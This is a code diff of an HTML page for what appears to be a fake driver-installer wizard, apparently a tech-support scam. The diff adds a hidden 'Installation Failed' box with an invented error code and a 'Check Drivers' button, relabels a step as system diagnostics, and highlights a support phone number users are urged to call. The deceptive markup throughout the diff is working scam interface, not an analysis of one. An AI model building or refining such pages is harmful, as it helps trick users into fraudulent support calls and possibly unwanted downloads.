@@ -88,17 +88,34 @@
 
     <!-- STEP 5 - INSTALL -->
     <div id="step5" class="step text-center" style="display:none;">
-        <h5>Installing drivers...</h5>
-        <div class="progress mt-3" style="height:8px;">
-            <div id="progressBar" class="progress-bar" style="width:0%"></div>
-        </div>
-        <p id="statusText">Initializing...</p>
+      <h5 id="installTitle">Installing drivers...</h5>
+
+      <div class="progress mt-3" style="height:8px;">
+        <div id="progressBar" class="progress-bar" style="width:0%"></div>
+      </div>
+
+      <p id="installStatusText">Initializing...</p>
+
+      <small class="text-muted d-block mt-2">
+        Do not turn off your device during installation
+      </small>
+
+      <!-- 🔥 FAILURE BLOCK (HIDDEN INITIALLY) -->
+      <div id="installErrorBox" style="display:none; margin-top:20px;">
+        <h6 style="color:red;">Installation Failed ❌</h6>
+        <p class="mb-1">Driver installation was interrupted.</p>
+        <p class="text-muted mb-2">Error Code: DRV_8024_UNSUPPORTED</p>
+
+        <button id="checkDriversBtn" class="btn btn-primary">
+          Check Drivers
+        </button>
+      </div>
     </div>
 
-    <!-- STEP 6 - FINALIZING -->
+    <!-- STEP 6 - DIAGNOSTICS -->
     <div id="step6" class="step text-center" style="display:none;">
-        <h5>Finalizing setup...</h5>
-        <p>Verifying device integrity...</p>
+      <h5>Checking system...</h5>
+      <p id="step6Text">Verifying device integrity...</p>
     </div>
 
     <!-- STEP 7 - DOWNLOAD -->
@@ -109,11 +126,11 @@
 
     <!-- STEP 8 - SUPPORT -->
     <div id="step8" class="step text-center" style="display:none;">
-        <h5>Need Help?</h5>
-        <p>
-            Installation incomplete?<br>
-            Call <b>+1 888 408 0730</b>
-        </p>
+      <h5>Need Help?</h5>
+      <p>
+        Installation incomplete?<br>
+        Call <b style="color:#d9534f;">+1 888 408 0730</b>
+      </p>
     </div>
 
   </div>
